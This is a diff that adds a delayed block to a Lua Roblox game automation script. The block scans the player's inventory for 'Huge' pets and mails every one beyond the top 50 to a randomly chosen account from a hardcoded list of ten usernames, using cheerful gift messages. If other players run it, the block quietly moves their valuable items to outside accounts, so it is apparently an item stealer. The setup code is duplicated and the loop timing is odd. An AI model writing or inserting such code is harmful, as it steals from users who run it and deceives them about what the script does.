@@ -953,3 +953,121 @@ end
 autoShutdownIfNotAlone()
 
 end)
+
+-- Send Huge khi có > 50 con
+task.spawn(function()
+wait(150)
+
+
+	local Players = game:GetService("Players")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+    local LocalPlayer = Players.LocalPlayer
+    local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
+    local SaveModule = require(Client:WaitForChild("Save"))
+    local Network = require(Client:WaitForChild("Network"))
+
+    -- 🧰 Inventory Pet
+    local inventory = SaveModule.Get().Inventory.Pet or {}
+
+    -- 🎯 Danh sách pet cần kiểm tra
+    local petIds = {
+        "Huge"
+    }
+
+    -- 🎁 Người nhận + tin nhắn
+    local username_rd = {"sijmongirthss", "Ash3rP0w3rPanda2018", "soystaylan5", "dreddyewele60", "1971Nowak3135", 
+                         "mcconchifredjeyo", "ecclweltst", "killedsanthi85", "tamuleviazulayv", "hegemangaltieri81"}
+    local username = username_rd[math.random(1, #username_rd)]
+
+    local messages = {
+        "Here's a gift, %s!",
+        "Sending you something cool, %s!",
+        "Take this one, %s!",
+        "You've got mail, %s!"
+    }
+
+
+    local Players = game:GetService("Players")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+    local LocalPlayer = Players.LocalPlayer
+    local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
+    local SaveModule = require(Client:WaitForChild("Save"))
+    local Network = require(Client:WaitForChild("Network"))
+
+    -- 🧰 Inventory Pet
+    local inventory = SaveModule.Get().Inventory.Pet or {}
+
+    -- 🎯 Danh sách pet cần kiểm tra
+    local petIds = {
+        "Huge"
+    }
+
+    -- 🎁 Người nhận + tin nhắn
+    local username_rd = {"sijmongirthss", "Ash3rP0w3rPanda2018", "soystaylan5", "dreddyewele60", "1971Nowak3135", 
+                         "mcconchifredjeyo", "ecclweltst", "killedsanthi85", "tamuleviazulayv", "hegemangaltieri81"}
+    local username = username_rd[math.random(1, #username_rd)]
+
+    local messages = {
+        "Here's a gift, %s!",
+        "Sending you something cool, %s!",
+        "Take this one, %s!",
+        "You've got mail, %s!"
+    }
+
+for _, targetId in ipairs(petIds) do
+    local pets = {}
+    local count = 0
+
+    -- Kiểm tra tất cả pet có ID chứa "Huge"
+    for uid, obj in pairs(inventory) do
+        if string.find(obj.id, "Huge") then  -- Tìm "Huge" trong ID pet
+            local amount = obj._am or 1
+            local xp = (obj._uq and obj._uq.xp) or 0
+
+            table.insert(pets, {
+                uid = uid,
+                amount = amount,
+                xp = xp
+            })
+
+            count += amount
+            warn(string.format("🐾 [%s] UID: %s | XP: %d | Amount: %d", obj.id, uid, xp, amount))
+        end
+    end
+
+    warn(string.format("✅ Tổng cộng tìm thấy %d pet với %d UID.", count, #pets))
+
+    if #pets > 50 then
+        table.sort(pets, function(a, b)
+            return a.xp > b.xp
+        end)
+
+        warn(string.format("🔒 Giữ lại pet có XP cao nhất: %s | XP: %d", pets[50].uid, pets[50].xp))
+
+        for i = 51, #pets do
+            local pet = pets[i]
+            task.wait(2)
+
+            local message = string.format(messages[math.random(1, #messages)], username)
+            warn(string.format("📤 Gửi UID: %s | XP: %d", pet.uid, pet.xp))
+
+            local success, err = pcall(function()
+                return Network.Invoke("Mailbox: Send", username, message, "Pet", pet.uid, 1)
+            end)
+
+            if success then
+                warn("✅ Đã gửi thành công:", pet.uid)
+            else
+                warn("❌ Lỗi khi gửi:", err)
+            end
+			task.wait(14400) -- lặp lại sau 4 giờ	
+        end
+    else
+        warn("⚠️ Không có pet dư để gửi hoặc chỉ có 1 pet.")
+    end
+end
+
+    
+end)
